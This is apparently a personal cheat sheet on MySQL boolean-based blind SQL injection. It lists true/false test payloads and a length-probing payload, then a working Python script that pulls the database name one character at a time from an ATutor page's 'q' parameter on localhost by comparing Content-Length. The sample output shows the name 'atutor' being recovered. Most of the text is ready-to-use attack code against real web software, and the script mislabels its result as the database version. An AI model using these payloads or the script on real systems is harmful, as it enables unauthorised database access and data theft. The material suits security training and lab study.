## MySQL Boolean Based Blind SQLi

- Identifying the vulnerability:
> - My Opinion and experience (don't take it literally but I guess it's true (for me atleast)):
>   - Normally Boolean Based Blind SQLi can be detected by keeping an eye on `Content-Length` header when payload is introduced.
>   - A drastic change in response length when the some query returns true as compared to when something returns false is a 100% sure giveaway of vulnerability.
> - Payload
> - True  
> ```sql
> AND 1=1
> AND 1=1 AND 'a'='a'
> ```
> - False
> ```sql
> AND 1=1 and 'a'='b'
> ```

- Exploitation:
- Retrieving the length of database name
> - Keep an eye on `Content-Length`
> - Payload: to check if the database name is of length 15
> ```sql
> and (length(database())) = 15 --
> ```
>

- Retrieving the database name
> - We should use ASCII function coz most of the time single quotes or double quotes might cause errors or problems.
> - Refer the following to see char to ascii conversion: https://www.rapidtables.com/code/text/ascii-table.html
> - I'm way too lazy now to write down how it works.
> - Try Understanding the following python code or make changes if you want:
> ```python
> import requests
>
> def atutor_dbRetrieval():
>     target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>     i = 1
>     final_string = ""
>     prev_length = -1
>     current_length = len(final_string)
>     while prev_length < current_length:
>         for j in range(32, 256):
>             payload = f"te')/**/or/**/(select/**/ascii(substring(database(),{i},1))={j})#"
>             param = {'q': payload}
>             r = requests.get(target, param)
>             content_length = int(r.headers['Content-length'])
>             if content_length > 20:
>                 final_string += chr(j)
>                 current_length = len(final_string.strip())
>                 print(final_string)
>                 break
>         prev_length += 1
>         i += 1
>     return final_string
> 
> if __name__ == "__main__":
>     print("[+] Retrieving Database name: ....")
>     print("[+] Database Version: ", atutor_dbRetrieval())
>     print("[+] Done")
> ```
> ```
> Output:
> python .\atutor_dbRetrieval.py
> [+] Retrieving Database name: ....
> a
> at
> atu
> atut
> atuto
> atutor
> [+] Database Version:  atutor
> [+] Done
> ```
